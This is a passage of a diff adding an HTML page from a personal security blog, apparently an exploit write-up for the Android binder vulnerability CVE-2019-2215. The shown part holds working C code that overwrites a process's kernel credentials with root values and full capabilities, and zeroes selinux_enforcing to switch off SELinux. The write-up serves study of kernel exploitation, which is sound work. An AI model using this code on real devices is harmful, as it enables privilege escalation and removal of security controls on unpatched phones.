+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="cm">/* writes the value we wrote to the pipe to the kaddr */</span>
+    <span class="k">if</span><span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="n">KREAD_PIPE</span><span class="p">,</span> <span class="n">user_value</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">!=</span> <span class="n">size</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[-] failed to copy data to userspace</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>Getting root privileges</strong></p>
+
+<p>Now that we can write to every address in the address space, we can overwrite the kernel <code class="language-plaintext highlighter-rouge">cred</code> struct to make it like <code class="language-plaintext highlighter-rouge">init_cred</code> (which represents the first task in Linux).</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">cred</span> <span class="n">init_cred</span> <span class="o">=</span> <span class="p">{</span>
+	<span class="p">.</span><span class="n">usage</span>			<span class="o">=</span> <span class="n">ATOMIC_INIT</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span>
+<span class="cp">#ifdef CONFIG_DEBUG_CREDENTIALS
+</span>	<span class="p">.</span><span class="n">subscribers</span>		<span class="o">=</span> <span class="n">ATOMIC_INIT</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span>
+	<span class="p">.</span><span class="n">magic</span>			<span class="o">=</span> <span class="n">CRED_MAGIC</span><span class="p">,</span>
+<span class="cp">#endif
+</span>	<span class="p">.</span><span class="n">uid</span>			<span class="o">=</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">gid</span>			<span class="o">=</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">suid</span>			<span class="o">=</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">sgid</span>			<span class="o">=</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">euid</span>			<span class="o">=</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">egid</span>			<span class="o">=</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">fsuid</span>			<span class="o">=</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">fsgid</span>			<span class="o">=</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">securebits</span>		<span class="o">=</span> <span class="n">SECUREBITS_DEFAULT</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">cap_inheritable</span>	<span class="o">=</span> <span class="n">CAP_EMPTY_SET</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">cap_permitted</span>		<span class="o">=</span> <span class="n">CAP_FULL_SET</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">cap_effective</span>		<span class="o">=</span> <span class="n">CAP_FULL_SET</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">cap_bset</span>		<span class="o">=</span> <span class="n">CAP_FULL_SET</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">user</span>			<span class="o">=</span> <span class="n">INIT_USER</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">user_ns</span>		<span class="o">=</span> <span class="o">&amp;</span><span class="n">init_user_ns</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">group_info</span>		<span class="o">=</span> <span class="o">&amp;</span><span class="n">init_groups</span><span class="p">,</span>
+	<span class="p">.</span><span class="n">ucounts</span>		<span class="o">=</span> <span class="o">&amp;</span><span class="n">init_ucounts</span><span class="p">,</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>Luckily for us a pointer to <code class="language-plaintext highlighter-rouge">cred</code> struct is stored inside <code class="language-plaintext highlighter-rouge">task_struct</code> so we can just read it with <code class="language-plaintext highlighter-rouge">kread64()</code> and then write to each member of the struct (using the releative offsets) with values from <code class="language-plaintext highlighter-rouge">init_cred</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">kernel_cred_patch</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] reading cred pointer from task_struct</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">cred_kptr</span> <span class="o">=</span> <span class="n">kread64</span><span class="p">(</span><span class="n">task_cred_kptr</span><span class="p">);</span>
+
+    <span class="cm">/* basically commit_cred(prepare_kernel_cred(0)); */</span>
+    <span class="n">kwrite32</span><span class="p">(</span><span class="n">cred_kptr</span> <span class="o">+</span> <span class="n">CRED_UID_OFFSET</span><span class="p">,</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">);</span>
+    <span class="n">kwrite32</span><span class="p">(</span><span class="n">cred_kptr</span> <span class="o">+</span> <span class="n">CRED_GID_OFFSET</span><span class="p">,</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">);</span>
+    <span class="n">kwrite32</span><span class="p">(</span><span class="n">cred_kptr</span> <span class="o">+</span> <span class="n">CRED_SUID_OFFSET</span><span class="p">,</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">);</span>
+    <span class="n">kwrite32</span><span class="p">(</span><span class="n">cred_kptr</span> <span class="o">+</span> <span class="n">CRED_SGID_OFFSET</span><span class="p">,</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">);</span>
+    <span class="n">kwrite32</span><span class="p">(</span><span class="n">cred_kptr</span> <span class="o">+</span> <span class="n">CRED_EUID_OFFSET</span><span class="p">,</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">);</span>
+    <span class="n">kwrite32</span><span class="p">(</span><span class="n">cred_kptr</span> <span class="o">+</span> <span class="n">CRED_EGID_OFFSET</span><span class="p">,</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">);</span>
+    <span class="n">kwrite32</span><span class="p">(</span><span class="n">cred_kptr</span> <span class="o">+</span> <span class="n">CRED_FSUID_OFFSET</span><span class="p">,</span> <span class="n">GLOBAL_ROOT_UID</span><span class="p">);</span>
+    <span class="n">kwrite32</span><span class="p">(</span><span class="n">cred_kptr</span> <span class="o">+</span> <span class="n">CRED_FSGID_OFFSET</span><span class="p">,</span> <span class="n">GLOBAL_ROOT_GID</span><span class="p">);</span>
+    <span class="n">kwrite32</span><span class="p">(</span><span class="n">cred_kptr</span> <span class="o">+</span> <span class="n">CRED_SECUREBITS_OFFSET</span><span class="p">,</span> <span class="n">SECUREBITS_DEFAULT</span><span class="p">);</span>
+    <span class="n">kwrite64</span><span class="p">(</span><span class="n">cred_kptr</span> <span class="o">+</span> <span class="n">CRED_CAP_INHERITABLE_OFFSET</span><span class="p">,</span> <span class="n">CAP_EMPTY_SET</span><span class="p">);</span>
+    <span class="n">kwrite64</span><span class="p">(</span><span class="n">cred_kptr</span> <span class="o">+</span> <span class="n">CRED_CAP_PERMITTED_OFFSET</span><span class="p">,</span> <span class="n">CAP_FULL_SET</span><span class="p">);</span>
+    <span class="n">kwrite64</span><span class="p">(</span><span class="n">cred_kptr</span> <span class="o">+</span> <span class="n">CRED_CAP_EFFECTIVE_OFFSET</span><span class="p">,</span> <span class="n">CAP_FULL_SET</span><span class="p">);</span>
+    <span class="n">kwrite64</span><span class="p">(</span><span class="n">cred_kptr</span> <span class="o">+</span> <span class="n">CRED_CAP_BSET_OFFSET</span><span class="p">,</span> <span class="n">CAP_FULL_SET</span><span class="p">);</span>
+    <span class="n">kwrite64</span><span class="p">(</span><span class="n">cred_kptr</span> <span class="o">+</span> <span class="n">CRED_CAP_AMBIENT_OFFSET</span><span class="p">,</span> <span class="n">CAP_EMPTY_SET</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>Disable SELinux enforcement</strong></p>
+
+<p>Now that we got root privileges we need to disable SELinux enforcement, that’s achivable by overwriting a global <code class="language-plaintext highlighter-rouge">int</code> called <code class="language-plaintext highlighter-rouge">selinux_enforcing</code> to 0, but we need the kernel base to know where the kernel starts then we can just find <code class="language-plaintext highlighter-rouge">selinux_enforcing</code> by using the relative offset (which may change between devices and versions).</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">disable_selinux_enforcing</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] reading init_nsproxy pointer from task_struct</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">init_nsproxy_kptr</span> <span class="o">=</span> <span class="n">kread64</span><span class="p">(</span><span class="n">task_init_nsproxy_kptr</span><span class="p">);</span>
+
+    <span class="n">kbase</span> <span class="o">=</span> <span class="n">init_nsproxy_kptr</span> <span class="o">-</span> <span class="n">SYMBOL_OFFSET_INIT_NSPROXY</span><span class="p">;</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] kernel base: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span> <span class="n">selinux_enforcing_kptr</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="n">SYMBOL_OFFSET_SELINUX_ENFORCING</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">kread32</span><span class="p">(</span><span class="n">selinux_enforcing_kptr</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span> <span class="n">ret</span> <span class="o">&amp;&amp;</span> <span class="n">ret</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] SELinux enforcing is enabled</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="n">kwrite32</span><span class="p">(</span><span class="n">selinux_enforcing_kptr</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] successfully disabled SELinux enforcing</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[+] SELinux enforcing is disabled</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><strong>Credits</strong></p>
+
+<p>Thanks to <a href="https://twitter.com/HackSysTeam">HackSysTeam</a> for the android kernel exploitation <a href="https://cloudfuzz.github.io/android-kernel-exploitation/">workshop</a>, <a href="https://twitter.com/SpecterDev">SpecterDev</a> for his <a href="https://dayzerosec.com/blog/2019/11/07/analyzing-androids-cve-2019-2215-dev-binder-uaf.html">writeup</a> about the same vulnerability, and <a href="https://twitter.com/maddiestone">Maddie Stone</a> for the original <a href="https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html">writeup</a>.<br />
+You can find my exploit implementation <a href="https://github.com/cutesmilee/pocs/blob/main/cve-2019-2215-exploit.c">here</a>.<br /></p>
+
+  </div><a class="u-url" href="/kernel/linux/android/2022/02/17/cve-2019-2215_writeup.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">cutesmilee&#39;s blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">cutesmilee&#39;s blog</li><li><a class="u-email" href="mailto:cutesmilee.research@protonmail.com">cutesmilee.research@protonmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/cutesmilee"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">cutesmilee</span></a></li><li><a href="https://www.twitter.com/cutesmilee__"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">cutesmilee__</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>a teenager who tries to hack kernels</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
